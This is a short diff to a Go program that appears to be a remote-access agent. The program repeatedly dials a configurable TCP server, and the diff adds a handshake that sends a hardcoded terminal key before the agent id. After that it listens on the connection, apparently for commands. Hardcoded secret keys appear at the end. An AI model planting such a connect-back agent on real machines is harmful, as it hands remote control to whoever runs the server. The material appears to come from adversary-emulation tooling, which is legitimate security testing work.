@@ -43,6 +43,12 @@ func listen(conn net.Conn) {
     }
 }
 
+func handshake(conn net.Conn) bool{
+    conn.Write([]byte(terminal_key))
+    conn.Write([]byte("\n"))
+    return true
+}
+
 func main() {
    host, _ := os.Hostname()
    user, _ := user.Current()
@@ -57,12 +63,14 @@ func main() {
       conn, err := net.Dial("tcp", *tcp)
       if err != nil {
          fmt.Println(err)
-         time.Sleep(5 * time.Second)
-         continue
+      } else {
+          handshake(conn)
+          conn.Write([]byte(paw))
+          listen(conn)
       }
-      conn.Write([]byte(paw))
-      listen(conn)
+      time.Sleep(5 * time.Second)
    }
 }
 
 var key = "MY3DUY6IVC5LN956Q4KUEQEZ2TRQL9"
+var terminal_key = "94699f9970213dd1d4054ca678f1278a"
